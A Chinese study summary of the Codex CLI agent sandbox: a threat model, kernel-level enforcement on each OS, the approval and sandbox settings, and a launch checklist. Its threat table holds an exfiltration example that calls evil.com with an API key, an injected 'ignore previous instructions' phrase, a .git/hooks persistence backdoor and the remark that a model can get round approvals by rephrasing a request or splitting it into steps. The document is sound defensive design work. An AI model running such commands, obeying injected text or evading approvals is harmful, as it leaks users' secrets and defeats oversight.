# 0007 — 全流程安全总账:每一步防的是什么,能迁移给哪些 agent

> 这是 codex-sandbox 学习(阶段 0–6)收官后的安全总结,不是操作手册。文中 `00NN` 指本目录 `lessons/00NN-*.md`,"指南"指 `reference/agent沙箱设计指南.md`。

## 1. 一句话总纲

这门课回答的安全命题是:**当一个"能真动手"的 agent(执行 shell、改文件、跑测试)面对不可信代码和不可信内容时,怎么保证"动手"不会变成"动手脚"。** 答案是一副骨架:**能力(sandbox)与交互(approval)拆成两个独立旋钮;安全边界画在操作系统内核里(macOS Seatbelt / Linux bubblewrap),模型看得见策略的后果、却够不到策略本身;一切默认 fail-closed;且沙箱必须可探测、可自证。** 一句话(0000 §3&4):**模型负责聪明,沙箱负责让聪明不越界。**

## 2. 威胁模型:它到底在防谁

把 agent 想象成一个被临时授权进你家干活的水电工:活干得好不好另说,关键是别让他顺手配走一把你家的钥匙。项目里实际探讨过的攻击路径分七类:

| # | 攻击路径 | 具体场景 | 出处 |
|---|---|---|---|
| T1 | **模型犯傻** | 幻觉、误解导致的破坏:`rm -rf` 删错目录、`echo` 覆盖 rc 文件 | 0000 §3、0001 §三 |
| T2 | **prompt injection 间接指挥** | 网页、issue、README、PR 正文里藏"忽略之前的指令";注入内容自己没权限,但能借 agent 的手 | 0000 §3&4、0006 场景1 |
| T3 | **凭据外泄** | 能读 `.env`/API key + 能建网络连接 = 读到什么泄什么(`curl evil.com?key=$OPENAI_API_KEY`) | 0002 §三 |
| T4 | **提权与持久化后门** | 可写的 `.git/hooks` 放个 `pre-commit`,下次你手动 `git commit`,它以**你的完整权限、在沙箱外**执行 | 0002 §四2 |
| T5 | **不可信代码执行** | 陌生仓库的 `npm test`/`postinstall`/Makefile 里藏恶意脚本——跑测试就是在跑攻击者的代码 | 0006 场景3/4 |
| T6 | **配置与默认值层出洞** | 默认值依赖目录信任记录而漂移(权限比你想的宽);旧配置别名静默变义(`on-failure`→`on-request`);过期教程教已删的 `--full-auto` | 0005、0004 §四 |
| T7 | **无人值守挂死** | headless 场景弹审批窗,管道另一端没人,CI 等到超时——不是偷数据,是权限系统设计必须消灭的故障形态 | 0005 §三2 |

第 3 节逐阶段标注每个机制主要压住哪几条。

## 3. 逐阶段安全收获

**阶段 0(前置概念,`lessons/0000-前置概念.md`)** — 全课程的定调:**限制的"执行者"决定限制的可靠性**。提示词"请不要删文件"由模型自觉执行,能被幻觉/注入破防;应用层正则拦危险命令,命令写法无穷多筛不完;只有内核沙箱,被限制者根本不知道笼子存在,越界就是一次普通的失败(EPERM)。这门课的价值定位:一个生产级 agent 权限系统的设计案例,能迁出六条原则(0000 §1、§6)。

**阶段 1(两个旋钮,`lessons/0001-两个旋钮.md`)** — 防 T1/T7 的认知地基。sandbox mode 管命令**物理上能做什么**(内核强制,违反就是 syscall 级 EPERM,模型无法跟内核讨价还价);approval policy 管**被挡后怎么办**(问你,还是把失败回喂给模型)。关键论断:**approval 可以被模型绕过**(换种方式请求、拆成多步),**sandbox 不能**;把"会不会弹窗"当成"安不安全"是全网最常见的错误。完整链路见 0001 §三:同一条 `echo hacked > ~/.zshrc`,在 `read-only+on-request` 下弹窗、你点头后**在沙箱外**执行,在 `read-only+never` 下硬拒绝、失败文案回喂模型自行绕道。

**阶段 2(三种模式,`lessons/0002-三种sandbox模式.md`)** — 防 T3/T4/T5 的能力面刻画。三档:**read-only**"能跑不能写"——策略以 `(deny default)` 开局但显式加回 `process-exec`/`process-fork`,所以能全速探索仓库、跑不写盘的测试,只是留不下痕迹;**workspace-write**"能写但不全写"——可写根 = cwd + TMPDIR + /tmp + 白名单追加项,根内再挖掉 `.git`/`.agents`/`.codex` 三个提权通道;**danger-full-access** = 没有笼子。两条独立闸门:网络默认关,且与文件权限分开审——"能读文件的 agent + 能联网 = 能外泄它读到的一切"(T3);元数据保护**防的是提权不是洁癖**——可写的 `.git/hooks` 就是任意代码执行路径(T4)。评估任何 agent 的写权限都要追问:"这个可写文件会被谁、在什么时机、以什么权限重新执行?"

**阶段 3(各 OS 强制实现,`lessons/0003-各OS强制实现.md`)** — 防"沙箱假装生效"(T6 的"你以为有保护"变体)。三平台后端**能力不等价**:macOS Seatbelt 开箱即用,`(deny default)` 白名单范式,网络是独立的叠加策略文件(不拼接就自动被 deny default 接管);Linux 默认 bubblewrap——整个文件系统先 `--ro-bind / /` 成只读,可写根 `--bind` 盖回可写,`.git` 再 `--ro-bind` 盖回只读,**关网 = `--unshare-net` 直接拆掉网络命名空间,是物理断网,不是改代理环境变量那种纸糊拦截**(Landlock 已降为 opt-in 兜底);Windows RestrictedToken 默认 Disabled,`workspace-write` 被**静默降级为 read-only**——宁可安全到没用,也不假装有保护,fail-closed 教科书(0003 §三)。

**阶段 4(审批与组合,`lessons/0004-approval与组合矩阵.md`)** — 防 T2 的"赌你点错"与配置债。五种沙箱×审批组合推演的结论:**审批是交互策略,不是安全策略;判断一个组合安不安全,只看沙箱那一列**。`untrusted` 没让系统更安全,只是让它更吵;"安静的安全" = **更紧的沙箱 + `never`**;`never` 的价值是把"等不到按键的挂死"变成"非零退出 + 消息"(T7)。`danger-full-access + never` 唯一可辩护的场景是外层已有别的沙箱。版本陷阱:`on-failure` 只剩 serde 别名,加载不报错但语义已静默变成 `on-request`(T6)——"能加载"≠"语义没变"。

**阶段 5(默认值与 exec,`lessons/0005-默认值与codex-exec.md`)** — 防 T6/T7 的制度化方案。默认值会**漂移**:同一 repo 克隆到两个目录,行为可以不同,因为"目录信任记录"是一份写在别处的、你看不见的状态——所以自动化必须显式 `--sandbox`。`codex exec` 把审批从设计里剔除:硬编码 `Never`(源码注释原话 "Default to never ask for approvals in headless mode"),而且 `-a` 旗标在这个子命令上**根本不存在**——"消灭一类故障的正确方式是让组合无法表达,而不是文档提醒"。`--full-auto` 的两种死法(TUI 硬删报错、exec 软删警告映射)示范了弃用策略怎么按存量自动化选(0005 §三)。

**阶段 6(配方与选型,`lessons/0006-实战配方与选型.md`)** — 原理兑现成四个配方,每个回扣一条前阶段原理:① read-only 评审——"会编辑的评审者就不再是评审者",内核级只读让**多个 agent 并行审同一仓库**成为安全操作;② 断网写盘——`CODEX_SANDBOX_NETWORK_DISABLED` 让测试套件感知沙箱、跳过联网用例而不是红一片(安全机制要可观测);③ CI exec——显式 `--sandbox read-only` + 自带 `never` + `--json`/`-o`,并点名 `--dangerously-bypass-approvals-and-sandbox` 当 CI 默认值是反面教材;④ `codex sandbox -- cmd` 先实测再信——"不能自测的安全机制只是声明"。外加五场景选型表(0006 §二、§三)。

## 4. 六条横切原则(比单个机制更值钱)

1. **先问"限制是谁执行的"**——提示词是贴纸条(可稀释、可覆盖),正则是筛子(筛不完),内核是笼子(越界即失败)。评估任何 agent 产品,答案是"模型自己"的安全措施基本等于没有。(0000 §1、0001)
2. **能力与交互分离**——"会不会弹窗"和"安不安全"是两回事。烦了调 approval 旋钮,别拿放开 sandbox 当解法;判断安全只看沙箱列。(0001、0004)
3. **一切默认 fail-closed**——网络默认关;平台没沙箱宁可降级到"安全到没用"并让人察觉;headless 硬编码 `never`。安全系统的默认方向必须是"关",出错时倒向安全一侧。(0002、0003、0005)
4. **追"可写路径能升级成什么"**——评估写权限不看面积看**再执行**:可写 `.git/hooks` = 以用户完整权限在沙箱外跑代码。"白名单目录 + 黑名单子目录"是标准姿势。(0002 §四2)
5. **文件权限和网络权限是两张清单**——能读 + 能联网 = 能外泄;断网要断在命名空间层(拔网线),不是断在配置层(贴封条)。(0002、0003)
6. **安全机制必须可验证,默认值必须显式**——既有让被跑代码感知沙箱的环境变量,又有 `codex sandbox --` 这样的探测口;会进脚本的行为必须能钉死,依赖隐式状态的默认值 = 抽奖。(0005、0006 配方2/4、指南 §5)

## 5. 迁移指南:这套沙箱思想能套到别的 agent 的哪些场景

| 场景 | 怎么套 | 防住什么攻击 |
|---|---|---|
| **给自己动手的 agent 设计权限系统** | 两档起步(read-only / workspace-write,砍掉 danger-full-access,指南 §1);应用层检查做体验、沙箱包装做地板(指南 §0/§3);**所有**能碰 shell/文件的工具收敛到同一个包装入口,不留"某个工具忘了包"的旁路(指南 §3) | 注入绕过提示词嘱咐;应用层正则被换种写法绕过;入口旁路让沙箱形同虚设 |
| **多 agent 并行评审/分析** | 全部参与 agent 跑 read-only:都能真读代码,谁也改不了,共享一个干净工作区 | 评审 agent "顺手"应用自己建议(会编辑的评审者不再是评审者);互相污染工作区;省掉每人一个 worktree 的合并地狱(0006 配方1) |
| **CI / 无人值守 agent** | exec 形态 + 硬编码 `never` + 显式 `--sandbox`(PR 机器人选 read-only);结论走 `--json`/`-o`,失败 = 非零退出 + 消息 | 审批窗挂死三小时(T7);runner 上默认值抽奖(T6);PR 正文注入让机器人改 CI 脚本——read-only 下注入成功也什么都改不了(T2)(0005、0006 配方3/场景1) |
| **跑陌生仓库的代码/依赖** | 先 `read-only + never` 只读分析,读完再放宽;要装包跑测试时 `workspace-write` + `network_access=false` | `npm test`/`postinstall` 里的恶意脚本写盘、放后门、外传凭据;注入内容诱导反复弹权限窗赌你点错(T2/T5)(0006 场景3、配方2) |
| **日常开发的编码 agent** | `workspace-write` + `network_access=false` + `on-request`(人在场才值得开"问");临时扩写边界用 `--add-dir` 而不是改配置 | 读到 `.env` 也发不出去(T3);一条过时报错就 `npm install` 来路不明的包(T5);弹窗疲劳——它比宽松配置更危险(0006 配方2/场景2) |
| **批量自动化(多仓库跑一夜)** | "全自动"的正确形态 = exec + 紧沙箱(`workspace-write` + `never`),不是 danger-full-access,更不是已删的 `--full-auto` | 第 37 个仓库的恶意 `postinstall` 在无沙箱下摸到整个 home 目录;workspace-write 下连 `.git/hooks` 都碰不到,出问题 `git checkout .` 就回去了(T4/T5)(0006 场景4) |
| **headless CLI / agent API 设计** | 不可能的组合让它**不可能表达**(headless 入口没有 `-a`);危险旗标按存量自动化选硬删(TUI)或软删带警告(exec);旧配置别名要审计语义变化 | 使用者照旧教程写出会挂死的组合;`on-failure` 式"能加载但变义"的配置债(T6/T7)(0005、0004 §四) |
| **攻防演示 / 安全评估落地** | 把 demo 的 `write_file`/`exec` 从"应用层拦截"升级为"内核 EPERM"(指南 §6 三步:包装入口 → workspace-write → 网络闸门),再关网复现"能读 SECRET + 能联网 = 外泄"看攻击断链 | 只靠字符串匹配的纸糊防线;注入驱动的写文件/执行从"也许被拦"变成"物理不可能"(0000 §6、指南 §6) |

## 6. 诚实的边界:它不解决什么(残余风险)

1. **read-only 不防"执行",只防"留下痕迹"**——策略显式 allow 了 `process-exec`/`process-fork`,陌生仓库 `npm test` 里藏的恶意脚本照样能在笼子里跑起来(消耗 CPU、读文件系统、探测环境),只是写不了盘、发不出去。它是"轻信仓库"的缓解,不是"隔离恶意代码"的完整方案(0002 §三、0006 场景3)。
2. **网络一开就破功**——`network_access = true` 之后,"能读 + 能联网 = 能外泄"立刻复活;而且 Codex 的网络闸门只有布尔开关,**没有**域名白名单——按域名限流是指南 §1 给"自己设计"时的改进建议,不是 Codex 已有能力(0002、指南 §1)。
3. **平台不等价,依赖的 OS 原语还会过期**——"Codex 有内核级沙箱"必须带平台定语:WSL1、禁止用户命名空间的加固容器上 bubblewrap 失灵;Seatbelt 已被苹果标记 deprecated(仍可用,但依赖的底层随时可能真被删);Landlock 只是 opt-in 兜底。沙箱在哪个平台、靠哪条原语,要逐台核实,不能一句话说"有"(0003、指南 §2)。
4. **存在"合法裸奔"的出口**——`danger-full-access` 和 `--dangerously-bypass-approvals-and-sandbox`(`--yolo`)永远在那儿,正当用途只有"外层已有别的沙箱"这一种;配错一次就是把墙拆了,而错误教程还在推荐它(0004、0006 场景4/5)。
5. **锚定版本的时效性**——全部论断验证于 `@openai/codex` 0.146.0,这套代码迭代极快(旗标改名、被删、默认值漂移是常态),动手前必须 `codex --help` 复核;`on-failure` 静默变义提醒我们:旧配置"能加载"≠"语义没变"(RESOURCES、0004 §四、0006 收官小结)。
6. **本机未实测**——本机未装 codex CLI,学习以概念 + 源码引用为主,配方 4 的沙箱探测没有真跑过;结论的可信度来自信源对照源码,不来自本机复现(MISSION 环境备注、0006 收官小结)。

## 7. 一页上线检查单:给任何"会动手的 agent"

```
□ 安全边界的执行者是内核,不是提示词/正则?(0000)
□ sandbox 和 approval 是两个独立旋钮,没把弹窗当安全边界?(0001/0004)
□ 会进脚本/CI 的调用都显式传了沙箱档位,默认值不依赖目录信任这类隐式状态?(0005)
□ 可写根是白名单(没拿用户主目录当默认值)?根内的 .git/.agents/.codex
  及一切"会被再执行"的路径挖成只读?(0002、指南 §1)
□ 网络默认关、显式开?文件权限和网络权限当两张清单分开审?(0002)
□ headless 入口强制 never 且无法表达弹窗组合?失败=非零退出+消息?(0005)
□ 平台缺沙箱能力时降级到更严并让用户能察觉,而不是静默裸跑?(0003)
□ 有探测手段(沙箱内试跑探测命令 + deny 日志)证明策略真的生效?(0006 配方4)
□ 有环境变量/观测点让被沙箱跑的测试能感知沙箱、跳过联网用例?(0006 配方2)
□ 评审/分析/陌生仓库任务用 read-only 撑住?多 agent 并行靠只读而不是
  发 worktree?没拿 danger-full-access 补平台窟窿?(0006 配方1/场景5)
```

**带走一句话**:这套机制的价值不在于某个旗标多聪明,而在于它把"agent 不越界"从一句嘱咐变成一个物理事实——模型可以被骗、教程可以过期、平台可以缺能力,但 `(deny default)` 之下,越界永远只是一次普通的失败,而且你随时可以 `codex sandbox --` 亲手验证这一点。
